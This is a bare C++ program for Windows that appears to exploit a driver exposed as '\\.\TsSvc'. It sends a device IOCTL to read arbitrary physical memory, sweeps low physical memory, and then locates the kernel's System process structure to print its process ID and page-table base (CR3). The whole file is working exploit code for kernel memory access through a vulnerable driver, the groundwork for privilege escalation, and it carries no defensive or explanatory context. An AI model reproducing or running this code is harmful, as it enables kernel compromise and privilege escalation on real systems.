#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <cstdint>
#include <cstdio>

static constexpr DWORD TS_READ = 0x80006498;

static bool Rd(HANDLE h, uint64_t pa, void* dst, DWORD sz) {
    DWORD got = 0;
    return DeviceIoControl(h, TS_READ, &pa, 8, dst, sz, &got, nullptr) && got == sz;
}

int main() {
    HANDLE h = CreateFileW(L"\\\\.\\TsSvc", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    printf("open handle=%p err=%lu\n", h, GetLastError());
    if (h == INVALID_HANDLE_VALUE) return 1;

    const uint64_t pas[] = {
        0x0, 0x1000, 0x2000, 0xA0000, 0x100000, 0x200000,
        0x1000000, 0x2000000, 0x10000000, 0x20000000,
        0x40000000, 0x80000000, 0x100000000ULL
    };
    for (uint64_t pa : pas) {
        uint32_t v = 0;
        BOOL ok = Rd(h, pa, &v, 4);
        printf("PA %010llx ok=%d gle=%lu val=%08x\n",
            (unsigned long long)pa, (int)ok, GetLastError(), v);
    }

    int okc = 0, failc = 0, nonzero = 0;
    uint32_t sample = 0;
    uint64_t samplePa = 0;
    for (uint64_t pa = 0; pa < 0x2000000ULL; pa += 0x1000) {
        uint32_t v = 0;
        if (!Rd(h, pa, &v, 4)) { failc++; continue; }
        okc++;
        if (v) { nonzero++; if (!sample) { sample = v; samplePa = pa; } }
    }
    printf("first 32MB pages ok=%d fail=%d nonzero=%d samplePA=%llx sample=%08x\n",
        okc, failc, nonzero, (unsigned long long)samplePa, sample);

    int hits = 0;
    const uint32_t nameOffs[] = { 0x338, 0x5A8 };
    for (uint32_t noff : nameOffs) {
        for (uint64_t pa = 0x100000; pa < 0x20000000ULL && hits < 12; pa += 0x1000) {
            uint32_t v = 0;
            if (!Rd(h, pa + noff, &v, 4) || v != 0x74737953) continue;
            char n[8] = {};
            Rd(h, pa + noff, n, 8);
            uint64_t pid = 0, cr3 = 0;
            uint32_t poff = (noff == 0x338) ? 0x1D0u : 0x440u;
            Rd(h, pa + poff, &pid, 8);
            Rd(h, pa + 0x28, &cr3, 8);
            printf("Syst page=%llx nameOff=%x name=%.8s pid=%llu cr3=%llx\n",
                (unsigned long long)pa, noff, n, (unsigned long long)pid, (unsigned long long)cr3);
            hits++;
        }
    }
    printf("Syst hits=%d\n", hits);
    CloseHandle(h);
    return 0;
}
